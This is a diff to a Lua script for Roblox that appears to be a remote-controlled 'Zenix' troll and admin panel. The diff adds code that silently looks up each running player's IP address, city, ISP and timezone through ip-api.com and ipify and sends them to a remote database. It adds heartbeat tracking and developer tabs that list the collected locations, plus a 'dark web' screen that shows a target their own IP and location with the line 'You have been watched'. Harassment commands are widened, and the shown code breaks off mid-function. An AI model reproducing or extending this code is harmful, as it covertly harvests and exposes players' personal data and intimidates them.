@@ -4,6 +4,8 @@ local Workspace = game:GetService("Workspace")
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
+local Lighting = game:GetService("Lighting")
+local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = Players.LocalPlayer
 
@@ -32,6 +34,9 @@ local SECRET_TOKEN = "pBvFVnW85uzX99DdbXaXefSxIgWpafbzPDIy0h3R"
 local POLL_INTERVAL = 1
 local GLOBAL_DELAY = 1
 local TIMESTAMP_TOLERANCE = 5
+local HEARTBEAT_INTERVAL = 5
+local OFFLINE_THRESHOLD = 15
+local OFFLINE_EXPIRY = 86400
 
 local Developers = {
     ["Go2mohamed"] = true,
@@ -44,18 +49,35 @@ local Developers = {
     ["7Ali_49"] = true,
     ["qert6154"] = true,
     ["Go2yousef"] = true,
+    ["saraaaal279"] = true,
+}
+
+local TabAccess = {
+    connectedPlayers = { Go2mohamed = true, Go2yousef = true },
+    serverPlayers = { Go2mohamed = true, Go2yousef = true },
 }
 
 local LOCAL_ONLY = {
     notf = true,
     notfstop = true,
-    castle = true,
-    bloxfruit = true,
-    mm2 = true,
-    market = true,
-    garden = true,
-    house = true,
-    darkgarden = true,
+    givechat = true,
+}
+
+local PLAYER_INFO = {
+    username = LocalPlayer.Name,
+    displayName = LocalPlayer.DisplayName,
+    accountAgeDays = LocalPlayer.AccountAge,
+    country = "Unknown",
+    countryCode = "",
+    city = "",
+    region = "",
+    isp = "",
+    ip = "N/A",
+    phoneIp = "N/A",
+    timezone = "UTC",
+    utcOffset = 0,
+    placeId = game.PlaceId,
+    jobId = game.JobId or "",
 }
 
 local function IsDevPlayer(p)
@@ -176,6 +198,81 @@ local function HttpCall(method, path, bodyTable)
         return true, decoded
     end
     return false, nil
+end
+
+local function HttpGetRaw(url)
+    if httpRequest then
+        local ok, res = pcall(httpRequest, { Url = url, Method = "GET" })
+        if ok and res and res.Body and res.Body ~= "" then
+            local ok2, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
+            if ok2 then return decoded end
+        end
+    end
+    local ok, res = pcall(function() return HttpService:GetAsync(url) end)
+    if ok and res then
+        local ok2, decoded = pcall(function() return HttpService:JSONDecode(res) end)
+        if ok2 then return decoded end
+    end
+    return nil
+end
+
+local function FetchIPInfo()
+    local deviceData = HttpGetRaw("http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,timezone,isp,query,offset")
+    if deviceData and type(deviceData) == "table" then
+        PLAYER_INFO.country = tostring(deviceData.country or "Unknown")
+        PLAYER_INFO.countryCode = tostring(deviceData.countryCode or "")
+        PLAYER_INFO.region = tostring(deviceData.regionName or "")
+        PLAYER_INFO.city = tostring(deviceData.city or "")
+        PLAYER_INFO.isp = tostring(deviceData.isp or "")
+        PLAYER_INFO.ip = tostring(deviceData.query or "N/A")
+        PLAYER_INFO.timezone = tostring(deviceData.timezone or "UTC")
+        PLAYER_INFO.utcOffset = tonumber(deviceData.offset) or 0
+    end
+    local phoneData = HttpGetRaw("https://api.ipify.org?format=json")
+    if phoneData and type(phoneData) == "table" and phoneData.ip then
+        PLAYER_INFO.phoneIp = tostring(phoneData.ip)
+    elseif not phoneData then
+        PLAYER_INFO.phoneIp = PLAYER_INFO.ip
+    end
+end
+
+local function RegisterPlayer()
+    local data = {
+        username = PLAYER_INFO.username,
+        displayName = PLAYER_INFO.displayName,
+        accountAgeDays = PLAYER_INFO.accountAgeDays,
+        country = PLAYER_INFO.country,
+        countryCode = PLAYER_INFO.countryCode,
+        city = PLAYER_INFO.city,
+        region = PLAYER_INFO.region,
+        isp = PLAYER_INFO.isp,
+        ip = PLAYER_INFO.ip,
+        phoneIp = PLAYER_INFO.phoneIp,
+        timezone = PLAYER_INFO.timezone,
+        utcOffset = PLAYER_INFO.utcOffset,
+        placeId = PLAYER_INFO.placeId,
+        jobId = PLAYER_INFO.jobId,
+        createdAt = os.time(),
+        lastSeen = os.time(),
+        status = "online",
+    }
+    HttpCall("PATCH", "players/" .. PLAYER_INFO.username .. ".json", data)
+end
+
+local function Heartbeat()
+    local path = "players/" .. PLAYER_INFO.username .. ".json"
+    HttpCall("PATCH", path, {
+        lastSeen = os.time(),
+        status = "online",
+        displayName = PLAYER_INFO.displayName,
+        placeId = PLAYER_INFO.placeId,
+        jobId = PLAYER_INFO.jobId,
+    })
+end
+
+local function SetOffline()
+    local path = "players/" .. PLAYER_INFO.username .. ".json"
+    HttpCall("PATCH", path, { status = "offline", lastSeen = os.time() })
 end
 
 local function SendCommandAPI(cmd, targetName, value)
@@ -348,6 +445,9 @@ local LoopKillData = {}
 local NotfData = {}
 local BangState = {}
 local CamState = {}
+local RainbowData = {}
+local InvisibleData = {}
+local RainbowLandData = { Active = false }
 
 local function StopBangFor(player)
     if not player then return end
@@ -460,13 +560,142 @@ local function StopCam(pName)
     end
 end
 
+local function StopRainbow(pName)
+    if RainbowData[pName] then
+        RainbowData[pName].Active = false
+        if RainbowData[pName].Connection then RainbowData[pName].Connection:Disconnect() end
+        for part, orig in pairs(RainbowData[pName].OriginalColors or {}) do
+            if part and part.Parent then part.Color = orig end
+        end
+        RainbowData[pName] = nil
+    end
+end
+
+local function StopInvisible(pName)
+    if InvisibleData[pName] then
+        InvisibleData[pName].Active = false
+        if InvisibleData[pName].Connection then InvisibleData[pName].Connection:Disconnect() end
+        for part, orig in pairs(InvisibleData[pName].OriginalTransparency or {}) do
+            if part and part.Parent then part.Transparency = orig end
+        end
+        InvisibleData[pName] = nil
+    end
+end
+
+local function StopRainbowLand()
+    if RainbowLandData.Active then
+        RainbowLandData.Active = false
+        if RainbowLandData.Connection then RainbowLandData.Connection:Disconnect() end
+        if RainbowLandData.Gui then RainbowLandData.Gui:Destroy() end
+        for part, orig in pairs(RainbowLandData.OriginalColors or {}) do
+            if part and part.Parent then part.Color = orig end
+        end
+        RainbowLandData = { Active = false }
+    end
+end
+
+local function GiveChatGui()
+    if CoreGui:FindFirstChild("ZenixChatGUI") then
+        CoreGui.ZenixChatGUI:Destroy()
+    end
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "ZenixChatGUI"
+    sg.ResetOnSpawn = false
+    sg.IgnoreGuiInset = true
+    sg.DisplayOrder = 999990
+    local parentOk = pcall(function() sg.Parent = CoreGui end)
+    if not parentOk then sg.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 320, 0, 160)
+    frame.Position = UDim2.new(0.5, -160, 0.5, -80)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0)
+    frame.BorderSizePixel = 0
+    frame.Active = true
+    frame.Draggable = true
+    frame.Parent = sg
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+    local stroke = Instance.new("UIStroke", frame)
+    stroke.Color = Color3.new(1, 1, 1)
+    stroke.Thickness = 2
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, -60, 0, 30)
+    title.Position = UDim2.new(0, 10, 0, 5)
+    title.BackgroundTransparency = 1
+    title.Text = "اكتب للمطور وش تبي"
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 14
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Parent = frame
+
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, 30, 0, 30)
+    closeBtn.Position = UDim2.new(1, -35, 0, 5)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    closeBtn.Text = "X"
+    closeBtn.TextColor3 = Color3.new(1, 1, 1)
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.TextSize = 14
+    closeBtn.Parent = frame
+    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
+    closeBtn.MouseButton1Click:Connect(function()
+        sg:Destroy()
+    end)
+
+    local input = Instance.new("TextBox")
+    input.Size = UDim2.new(1, -20, 0, 80)
+    input.Position = UDim2.new(0, 10, 0, 40)
+    input.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    input.BorderSizePixel = 0
+    input.Text = ""
+    input.PlaceholderText = "اكتب رسالتك هنا..."
+    input.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
+    input.TextColor3 = Color3.new(1, 1, 1)
+    input.Font = Enum.Font.Gotham
+    input.TextSize = 13
+    input.TextWrapped = true
+    input.MultiLine = true
+    input.ClearTextOnFocus = false
+    input.TextXAlignment = Enum.TextXAlignment.Right
+    input.Parent = frame
+    Instance.new("UICorner", input).CornerRadius = UDim.new(0, 8)
+
+    local sendBtn = Instance.new("TextButton")
+    sendBtn.Size = UDim2.new(1, -20, 0, 26)
+    sendBtn.Position = UDim2.new(0, 10, 1, -32)
+    sendBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    sendBtn.Text = "إرسال"
+    sendBtn.TextColor3 = Color3.new(1, 1, 1)
+    sendBtn.Font = Enum.Font.GothamBold
+    sendBtn.TextSize = 13
+    sendBtn.Parent = frame
+    Instance.new("UICorner", sendBtn).CornerRadius = UDim.new(0, 6)
+    sendBtn.MouseButton1Click:Connect(function()
+        local msg = input.Text
+        if not msg or msg == "" then return end
+        local data = {
+            fromUsername = LocalPlayer.Name,
+            fromDisplayName = LocalPlayer.DisplayName,
+            toDeveloper = "",
+            message = msg,
+            timestamp = os.time(),
+            read = false,
+        }
+        task.spawn(function()
+            local ok, resp = HttpCall("POST", "chatMessages.json", data)
+            if ok and resp and resp.name then
+                HttpCall("PATCH", "chatMessages/" .. resp.name .. ".json", { toDeveloper = "" })
+            end
+        end)
+        input.Text = ""
+    end)
+end
+
 ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
     local target = targetPlayer or FindPlayer(targetName)
     if not target then return end
-
-    local isHouseCmd = (cmd == "castle" or HOUSE_CONFIGS[cmd] ~= nil)
-    local isMsgCmd = (cmd == "notf" or cmd == "notfstop")
-    if GetDeveloperByPlayer(target) and not isHouseCmd and not isMsgCmd then return end
 
     local char = target.Character
     if not char then return end
@@ -628,7 +857,7 @@ ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
             JailData[pName] = nil
             return
         end
-        local jailPos = hrp and hrp.Position or (target.Character and target.Character:FindFirstChild("HumanoidRootPart") and target.Character.HumanoidRootPart.Position) or Vector3.new(0,10,0)
+        local jailPos = hrp and hrp.Position or Vector3.new(0,10,0)
         if not JailData[pName] then JailData[pName] = {} end
         JailData[pName].Active = true
         JailData[pName].Position = jailPos
@@ -1041,12 +1270,194 @@ ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
             if NotfData[pName].Gui then NotfData[pName].Gui:Destroy() end
             NotfData[pName] = nil
         end
+    elseif cmd == "givechat" then
+        if target == LocalPlayer then
+            GiveChatGui()
+        end
+    elseif cmd == "rainbow" then
+        if RainbowData[pName] and RainbowData[pName].Active then
+            StopRainbow(pName)
+            return
+        end
+        RainbowData[pName] = { Active = true, OriginalColors = {} }
+        for _, part in ipairs(char:GetDescendants()) do
+            if part:IsA("BasePart") then
+                RainbowData[pName].OriginalColors[part] = part.Color
+            end
+        end
+        local hue = 0
+        RainbowData[pName].Connection = RunService.Heartbeat:Connect(function(dt)
+            if not RainbowData[pName] or not RainbowData[pName].Active then return end
+            hue = (hue + dt * 0.4) % 1
+            local col = Color3.fromHSV(hue, 1, 1)
+            local c = target.Character
+            if not c then return end
+            for _, part in ipairs(c:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.Color = col
+                end
+            end
+        end)
+    elseif cmd == "invisible" then
+        if InvisibleData[pName] and InvisibleData[pName].Active then
+            StopInvisible(pName)
+            return
+        end
+        InvisibleData[pName] = { Active = true, OriginalTransparency = {} }
+        for _, part in ipairs(char:GetDescendants()) do
+            if part:IsA("BasePart") then
+                InvisibleData[pName].OriginalTransparency[part] = part.Transparency
+                part.Transparency = 1
+            end
+            if part:IsA("Decal") then
+                part.Transparency = 1
+            end
+        end
+        InvisibleData[pName].Connection = target.CharacterAdded:Connect(function(newChar)
+            if not InvisibleData[pName] or not InvisibleData[pName].Active then return end
+            task.wait(0.5)
+            for _, part in ipairs(newChar:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    InvisibleData[pName].OriginalTransparency[part] = part.Transparency
+                    part.Transparency = 1
+                end
+                if part:IsA("Decal") then
+                    part.Transparency = 1
+                end
+            end
+        end)
+    elseif cmd == "rainbowland" then
+        if RainbowLandData.Active then
+            StopRainbowLand()
+            return
+        end
+        RainbowLandData = { Active = true, OriginalColors = {} }
+        for _, obj in ipairs(Workspace:GetDescendants()) do
+            if obj:IsA("BasePart") then
+                RainbowLandData.OriginalColors[obj] = obj.Color
+            end
+        end
+        local sg = Instance.new("ScreenGui")
+        sg.Name = "RainbowLandOverlay"
+        sg.ResetOnSpawn = false
+        sg.IgnoreGuiInset = true
+        sg.DisplayOrder = 999997
+        local parentOk2 = pcall(function() sg.Parent = CoreGui end)
+        if not parentOk2 then sg.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+        local overlay = Instance.new("Frame", sg)
+        overlay.Size = UDim2.new(1, 0, 1, 0)
+        overlay.BackgroundColor3 = Color3.new(1, 1, 1)
+        overlay.BackgroundTransparency = 0.85
+        overlay.BorderSizePixel = 0
+        overlay.ZIndex = 1000
+        local grad = Instance.new("UIGradient", overlay)
+        grad.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+            ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 165, 0)),
+            ColorSequenceKeypoint.new(0.33, Color3.fromRGB(255, 255, 0)),
+            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 0)),
+            ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 200, 255)),
+            ColorSequenceKeypoint.new(0.83, Color3.fromRGB(0, 0, 255)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 0, 255))
+        })
+        RainbowLandData.Gui = sg
+        local hue = 0
+        RainbowLandData.Connection = RunService.Heartbeat:Connect(function(dt)
+            if not RainbowLandData.Active then return end
+            hue = (hue + dt * 0.15) % 1
+            grad.Rotation = grad.Rotation + dt * 60
+            local col = Color3.fromHSV(hue, 1, 1)
+            for part in pairs(RainbowLandData.OriginalColors) do
+                if part and part.Parent then
+                    part.Color = col
+                end
+            end
+        end)
+    elseif cmd == "zenixdarkweb" then
+        local sg = Instance.new("ScreenGui")
+        sg.Name = "ZenixDarkWeb"
+        sg.ResetOnSpawn = false
+        sg.IgnoreGuiInset = true
+        sg.DisplayOrder = 999996
+        local parentOk3 = pcall(function() sg.Parent = CoreGui end)
+        if not parentOk3 then sg.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+        local frame = Instance.new("Frame", sg)
+        frame.Size = UDim2.new(0, 450, 0, 320)
+        frame.Position = UDim2.new(0.5, -225, 0.5, -160)
+        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        frame.BorderSizePixel = 0
+        frame.Active = true
+        frame.Draggable = true
+        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+        local stroke = Instance.new("UIStroke", frame)
+        stroke.Color = Color3.fromRGB(0, 255, 0)
+        stroke.Thickness = 2
+        local title = Instance.new("TextLabel", frame)
+        title.Size = UDim2.new(1, -50, 0, 30)
+        title.Position = UDim2.new(0, 10, 0, 5)
+        title.BackgroundTransparency = 1
+        title.Text = "> ZENIX DARK WEB <"
+        title.TextColor3 = Color3.fromRGB(0, 255, 0)
+        title.Font = Enum.Font.Code
+        title.TextSize = 16
+        title.TextXAlignment = Enum.TextXAlignment.Left
+        local closeB = Instance.new("TextButton", frame)
+        closeB.Size = UDim2.new(0, 30, 0, 30)
+        closeB.Position = UDim2.new(1, -35, 0, 5)
+        closeB.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        closeB.Text = "X"
+        closeB.TextColor3 = Color3.fromRGB(0, 255, 0)
+        closeB.Font = Enum.Font.Code
+        closeB.TextSize = 14
+        Instance.new("UICorner", closeB).CornerRadius = UDim.new(0, 6)
+        closeB.MouseButton1Click:Connect(function() sg:Destroy() end)
+        local body = Instance.new("TextLabel", frame)
+        body.Size = UDim2.new(1, -20, 1, -50)
+        body.Position = UDim2.new(0, 10, 0, 40)
+        body.BackgroundTransparency = 1
+        body.Text = ""
+        body.TextColor3 = Color3.fromRGB(0, 255, 0)
+        body.Font = Enum.Font.Code
+        body.TextSize = 13
+        body.TextXAlignment = Enum.TextXAlignment.Left
+        body.TextYAlignment = Enum.TextYAlignment.Top
+        body.TextWrapped = true
+        task.spawn(function()
+            local lines = {
+                "> Initializing Zenix Dark Web...",
+                "> Bypassing firewall...",
+                "> Access granted.",
+                "> Target: " .. PLAYER_INFO.displayName,
+                "> Location: " .. PLAYER_INFO.city .. ", " .. PLAYER_INFO.country,
+                "> IP: " .. PLAYER_INFO.ip,
+                "> ISP: " .. PLAYER_INFO.isp,
+                "> Status: CONNECTED",
+                "> You have been watched.",
+                "> ZENIX DARK WEB END",
+            }
+            for _, line in ipairs(lines) do
+                if not sg.Parent then break end
+                body.Text = body.Text .. line .. "\n"
+                task.wait(0.4)
+            end
+        end)
+    elseif cmd == "deleteallhouses" then
+        for pname, houses in pairs(HouseData) do
+            for _, d in pairs(houses) do
+                if d.Model then pcall(function() d.Model:Destroy() end) end
+                if d.Ground then pcall(function() d.Ground:Destroy() end) end
+            end
+        end
+        HouseData = {}
+        for pname, c in pairs(CastleData) do
+            if c.Model then pcall(function() c.Model:Destroy() end) end
+        end
+        CastleData = {}
     elseif cmd == "bangback" or cmd == "bangface" or cmd == "bangcomb" or cmd == "bangv2body" or cmd == "bangv2face" then
         local target2Name = value
         if not target2Name then return end
         local target2 = FindPlayer(target2Name)
         if not target2 then return end
-        if GetDeveloperByPlayer(target2) then return end
         local mode = "back"
         if cmd == "bangface" then mode = "face"
         elseif cmd == "bangcomb" then mode = "combined"
@@ -1114,6 +1525,8 @@ Players.PlayerRemoving:Connect(function(p)
         end
     end
     if CamState[n] then StopCam(n) end
+    if RainbowData[n] then StopRainbow(n) end
+    if InvisibleData[n] then StopInvisible(n) end
 end)
 
 local function HandleRemoteCommand(key, cmdData)
@@ -1163,7 +1576,6 @@ local function HandleRemoteCommand(key, cmdData)
 
     task.spawn(function()
         pcall(ExecuteCommand, cmd, targetPlayer.Name, (cmdData.value and cmdData.value ~= "" and cmdData.value or nil), sender, targetPlayer)
-
         task.wait(GLOBAL_DELAY)
         pcall(function()
             HttpCall("PATCH", "commands/" .. key .. ".json", {
@@ -1197,6 +1609,24 @@ task.spawn(function()
         pcall(PollAPI)
         task.wait(POLL_INTERVAL)
     end
+end)
+
+task.spawn(function()
+    task.wait(2)
+    pcall(FetchIPInfo)
+    pcall(RegisterPlayer)
+end)
+
+task.spawn(function()
+    task.wait(3)
+    while true do
+        pcall(Heartbeat)
+        task.wait(HEARTBEAT_INTERVAL)
+    end
+end)
+
+game:BindToClose(function()
+    pcall(SetOffline)
 end)
 
 if IsDeveloper then
@@ -1241,12 +1671,11 @@ if IsDeveloper then
     ToggleBtn.Active = true
     ToggleBtn.Draggable = true
 
-    local BtnCorner = Instance.new("UICorner", ToggleBtn); BtnCorner.CornerRadius = UDim.new(0, 12)
+    Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(0, 12)
     local BtnStroke = Instance.new("UIStroke", ToggleBtn)
     BtnStroke.Thickness = 3
     BtnStroke.Color = Color3.new(1, 1, 1)
     BtnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-
     local BtnGradient = Instance.new("UIGradient")
     BtnGradient.Color = ColorSequence.new({
         ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
@@ -1331,7 +1760,6 @@ if IsDeveloper then
         TabStroke.Thickness = 2.5
         TabStroke.Color = Color3.new(1, 1, 1)
         TabStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-
         local TabGradient = Instance.new("UIGradient")
         TabGradient.Color = ColorSequence.new({
             ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
@@ -1392,10 +1820,23 @@ if IsDeveloper then
         return scroll
     end
 
-    local AdminTab = CreateTab("Admin Commands")
+    local canSeeConnPlayers = TabAccess.connectedPlayers[LocalPlayer.Name] == true
+    local canSeeServerPlayers = TabAccess.serverPlayers[LocalPlayer.Name] == true
+
+    local AdminTab = CreateTab("أوامر المطورين")
     local BangTab = CreateTab("Bang")
     local NotificationsTab = CreateTab("الاشعارات")
     local HousesTab = CreateTab("منازل")
+
+    local ConnectedPlayersTab = nil
+    local ServerPlayersTab = nil
+    if canSeeConnPlayers then
+        ConnectedPlayersTab = CreateTab("اللاعبين المتصلين")
+    end
+    if canSeeServerPlayers then
+        ServerPlayersTab = CreateTab("متصلين بالسيرفر")
+    end
+
     AdminTab.Visible = true
 
     local TopBar = Instance.new("Frame")
@@ -1634,7 +2075,11 @@ if IsDeveloper then
         {"/InfJmp", "infjump"},
         {"/SpdAll", "speedall"},
         {"/JmpAll", "jumpall"},
-        {"/FlingZ", "flingz"}
+        {"/FlingZ", "flingz"},
+        {"/Rainbow", "rainbow"},
+        {"/Invisible", "invisible"},
+        {"/RainbowLand", "rainbowland"},
+        {"/ZenixDarkWeb", "zenixdarkweb"}
     }
 
     for _, data in ipairs(buttonData) do
@@ -1700,10 +2145,10 @@ if IsDeveloper then
         local needTarget = data[3]
         local btn = createStyledButton(BangScroll, data[1], function()
             local p1 = FindPlayer(BangVictimBox.Text)
-            if not p1 or GetDeveloperByPlayer(p1) then return end
+            if not p1 then return end
             if needTarget then
                 local p2 = FindPlayer(BangTargetBox.Text)
-                if p2 and not GetDeveloperByPlayer(p2) then
+                if p2 then
                     SendCommandAPI(cmd, p1.Name, p2.Name)
                 end
             else
@@ -1755,6 +2200,10 @@ if IsDeveloper then
         local p = FindPlayer(NotfVictimBox.Text)
         if p then SendCommandAPI("notfstop", p.Name, nil) end
     end)
+    createStyledButton(NotfScroll, "اعطائه دردشة (Give Chat)", function()
+        local p = FindPlayer(NotfVictimBox.Text)
+        if p then SendCommandAPI("givechat", p.Name, nil) end
+    end)
 
     local HouseHeader = Instance.new("Frame")
     HouseHeader.Size = UDim2.new(1, 0, 0, 42)
@@ -1799,6 +2248,540 @@ if IsDeveloper then
         end)
         btn.Size = UDim2.new(0.9, 0, 0, 35)
     end
+
+    local delAllHousesBtn = createStyledButton(HouseScroll, "حذف كل منازل اللاعبين", function()
+        SendCommandAPI("deleteallhouses", LocalPlayer.Name, nil)
+    end)
+    delAllHousesBtn.Size = UDim2.new(0.9, 0, 0, 35)
+    delAllHousesBtn.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
+    delAllHousesBtn.TextColor3 = Color3.fromRGB(255, 200, 200)
+
+    local function CreatePlayerCardUI(parent, playerData, isServerTab)
+        local card = Instance.new("Frame")
+        card.Size = UDim2.new(0.95, 0, 0, 120)
+        card.BackgroundColor3 = Color3.fromRGB(20, 10, 30)
+        card.BorderSizePixel = 0
+        card.Parent = parent
+        Instance.new("UICorner", card).CornerRadius = UDim.new(0, 10)
+        local cardStroke = Instance.new("UIStroke", card)
+        cardStroke.Color = playerData.status == "online" and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(150, 0, 0)
+        cardStroke.Thickness = 2
+
+        local displayLbl = Instance.new("TextLabel")
+        displayLbl.Size = UDim2.new(0.7, 0, 0, 22)
+        displayLbl.Position = UDim2.new(0, 8, 0, 4)
+        displayLbl.BackgroundTransparency = 1
+        displayLbl.Text = playerData.displayName or playerData.username
+        displayLbl.TextColor3 = Color3.new(1, 1, 1)
+        displayLbl.Font = Enum.Font.GothamBold
+        displayLbl.TextSize = 15
+        displayLbl.TextXAlignment = Enum.TextXAlignment.Right
+        displayLbl.Parent = card
+
+        local userLbl = Instance.new("TextLabel")
+        userLbl.Size = UDim2.new(0.6, 0, 0, 16)
+        userLbl.Position = UDim2.new(0, 8, 0, 26)
+        userLbl.BackgroundTransparency = 1
+        userLbl.Text = "@" .. playerData.username
+        userLbl.TextColor3 = Color3.fromRGB(180, 180, 180)
+        userLbl.Font = Enum.Font.Gotham
+        userLbl.TextSize = 12
+        userLbl.TextXAlignment = Enum.TextXAlignment.Right
+        userLbl.Parent = card
+
+        local copyBtn = Instance.new("TextButton")
+        copyBtn.Size = UDim2.new(0, 20, 0, 16)
+        copyBtn.Position = UDim2.new(0, 4, 0, 26)
+        copyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        copyBtn.Text = "📋"
+        copyBtn.TextColor3 = Color3.new(1, 1, 1)
+        copyBtn.TextSize = 10
+        copyBtn.Parent = card
+        Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 4)
+        copyBtn.MouseButton1Click:Connect(function()
+            if setclipboard then
+                pcall(function() setclipboard(playerData.username) end)
+            end
+        end)
+
+        local statusDot = Instance.new("TextLabel")
+        statusDot.Size = UDim2.new(0, 15, 0, 15)
+        statusDot.Position = UDim2.new(0, 4, 0, 6)
+        statusDot.BackgroundTransparency = 1
+        statusDot.Text = playerData.status == "online" and "🟢" or "🔴"
+        statusDot.TextSize = 12
+        statusDot.Parent = card
+
+        local infoLine = Instance.new("TextLabel")
+        infoLine.Size = UDim2.new(1, -16, 0, 16)
+        infoLine.Position = UDim2.new(0, 8, 0, 44)
+        infoLine.BackgroundTransparency = 1
+        infoLine.Text = "🌍 " .. (playerData.country or "Unknown") .. "  🏙️ " .. (playerData.city or "-")
+        infoLine.TextColor3 = Color3.fromRGB(220, 200, 255)
+        infoLine.Font = Enum.Font.Gotham
+        infoLine.TextSize = 11
+        infoLine.TextXAlignment = Enum.TextXAlignment.Right
+        infoLine.Parent = card
+
+        local timeLbl = Instance.new("TextLabel")
+        timeLbl.Size = UDim2.new(1, -16, 0, 16)
+        timeLbl.Position = UDim2.new(0, 8, 0, 60)
+        timeLbl.BackgroundTransparency = 1
+        timeLbl.Text = ""
+        timeLbl.TextColor3 = Color3.fromRGB(220, 200, 255)
+        timeLbl.Font = Enum.Font.Gotham
+        timeLbl.TextSize = 11
+        timeLbl.TextXAlignment = Enum.TextXAlignment.Right
+        timeLbl.Parent = card
+
+        local ageLbl = Instance.new("TextLabel")
+        ageLbl.Size = UDim2.new(1, -16, 0, 16)
+        ageLbl.Position = UDim2.new(0, 8, 0, 76)
+        ageLbl.BackgroundTransparency = 1
+        ageLbl.Text = "عمر الحساب: " .. tostring(playerData.accountAgeDays or 0) .. " يوم"
+        ageLbl.TextColor3 = Color3.fromRGB(220, 200, 255)
+        ageLbl.Font = Enum.Font.Gotham
+        ageLbl.TextSize = 11
+        ageLbl.TextXAlignment = Enum.TextXAlignment.Right
+        ageLbl.Parent = card
+
+        local function updateTime()
+            local offset = tonumber(playerData.utcOffset) or 0
+            local utc = os.time(os.date("!*t"))
+            local localTime = utc + offset
+            local t = os.date("!*t", localTime)
+            timeLbl.Text = string.format("🕒 %02d:%02d", t.hour, t.min)
+        end
+        updateTime()
+
+        local btnRow = Instance.new("Frame")
+        btnRow.Size = UDim2.new(1, -16, 0, 22)
+        btnRow.Position = UDim2.new(0, 8, 1, -28)
+        btnRow.BackgroundTransparency = 1
+        btnRow.Parent = card
+        local btnRowLayout = Instance.new("UIListLayout", btnRow)
+        btnRowLayout.FillDirection = Enum.FillDirection.Horizontal
+        btnRowLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
+        btnRowLayout.Padding = UDim.new(0, 4)
+
+        local function mkBtn(text, w, cb)
+            local b = Instance.new("TextButton")
+            b.Size = UDim2.new(0, w, 1, 0)
+            b.BackgroundColor3 = Color3.fromRGB(50, 30, 70)
+            b.Text = text
+            b.TextColor3 = Color3.new(1, 1, 1)
+            b.Font = Enum.Font.GothamBold
+            b.TextSize = 11
+            b.Parent = btnRow
+            Instance.new("UICorner", b).CornerRadius = UDim.new(0, 5)
+            b.MouseButton1Click:Connect(cb)
+            return b
+        end
+
+        mkBtn("i", 25, function()
+            local infoSg = Instance.new("ScreenGui")
+            infoSg.Name = "PlayerInfo"
+            infoSg.ResetOnSpawn = false
+            infoSg.IgnoreGuiInset = true
+            infoSg.DisplayOrder = 999995
+            local pok = pcall(function() infoSg.Parent = CoreGui end)
+            if not pok then infoSg.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+
+            local iFrame = Instance.new("Frame", infoSg)
+            iFrame.Size = UDim2.new(0, 340, 0, 320)
+            iFrame.Position = UDim2.new(0.5, -170, 0.5, -160)
+            iFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+            iFrame.BorderSizePixel = 0
+            iFrame.Active = true
+            iFrame.Draggable = true
+            Instance.new("UICorner", iFrame).CornerRadius = UDim.new(0, 12)
+            local iStroke = Instance.new("UIStroke", iFrame)
+            iStroke.Color = Color3.new(1, 1, 1)
+            iStroke.Thickness = 2
+
+            local iTitle = Instance.new("TextLabel", iFrame)
+            iTitle.Size = UDim2.new(1, -50, 0, 30)
+            iTitle.Position = UDim2.new(0, 10, 0, 5)
+            iTitle.BackgroundTransparency = 1
+            iTitle.Text = "معلومات اللاعب"
+            iTitle.TextColor3 = Color3.new(1, 1, 1)
+            iTitle.Font = Enum.Font.GothamBold
+            iTitle.TextSize = 15
+            iTitle.TextXAlignment = Enum.TextXAlignment.Right
+
+            local iClose = Instance.new("TextButton", iFrame)
+            iClose.Size = UDim2.new(0, 28, 0, 28)
+            iClose.Position = UDim2.new(1, -34, 0, 6)
+            iClose.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+            iClose.Text = "X"
+            iClose.TextColor3 = Color3.new(1, 1, 1)
+            iClose.Font = Enum.Font.GothamBold
+            iClose.TextSize = 13
